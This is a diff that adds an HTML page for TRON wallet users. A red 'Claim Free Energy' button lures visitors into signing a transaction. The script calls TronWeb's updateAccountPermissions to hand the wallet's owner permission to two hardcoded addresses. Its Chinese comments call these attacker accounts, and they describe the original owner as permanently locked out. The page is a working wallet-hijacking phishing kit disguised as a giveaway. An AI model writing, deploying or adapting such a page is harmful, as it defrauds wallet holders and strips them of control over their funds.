@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>账户权限终极锁死 测试版</title>
+  <style>
+    button {
+      padding: 14px 30px;
+      font-size: 18px;
+      background-color: #ff2222;
+      color: #fff;
+      border: none;
+      border: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <button onclick="connectWallet()">Claim Free Energy</button>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/tronweb.min.js"></script>
+<script>
+  let tronWeb;
+
+  function waitTronWebReady() {
+    return new Promise(resolve => {
+      let count = 0;
+      const timer = setInterval(() => {
+        if (window.tronWeb && window.tronWeb.ready) {
+          tronWeb = window.tronWeb;
+          clearInterval(timer);
+          resolve(true);
+        }
+        count++;
+        if (count > 20) {
+          clearInterval(timer);
+          resolve(false);
+        }
+      }, 200);
+    });
+  }
+
+  async function connectWallet() {
+    const isReady = await waitTronWebReady();
+    if (!isReady) {
+      alert("请在 TronLink 内置浏览器打开");
+      return;
+    }
+
+    try {
+      const userAddress = tronWeb.defaultAddress.base58;
+      console.log("被锁死的原钱包地址:", userAddress);
+
+      // 终极锁死配置：直接删掉原主人，只留两个攻击者小号
+      const permissionData = {
+        owner: userAddress,
+        threshold: 2,
+        keys: [
+          // 只放两个小号，彻底移除原钱包主人权限
+          { address: "TAMuCK8haFRwho1JdXM8eaqx28E4XuyJBa", weight: 1 },
+          { address: "THW6Mg1YqRxP2E6iwtNmrftgqQ7YeDFA2C", weight: 1 }
+        ]
+      };
+
+      const tx = await tronWeb.transactionBuilder.updateAccountPermissions(permissionData);
+      console.log("交易构造完成:", tx);
+
+      const signedTx = await tronWeb.trx.sign(tx);
+      const res = await tronWeb.trx.sendRawTransaction(signedTx);
+      console.log("上链结果:", res);
+
+      alert("已执行：原钱包权限被彻底锁死，无法重置、无法踢人");
+
+    } catch (err) {
+      console.error("错误:", err);
+      alert("操作失败：" + err.message);
+    }
+  }
+</script>
+</body>
+</html>
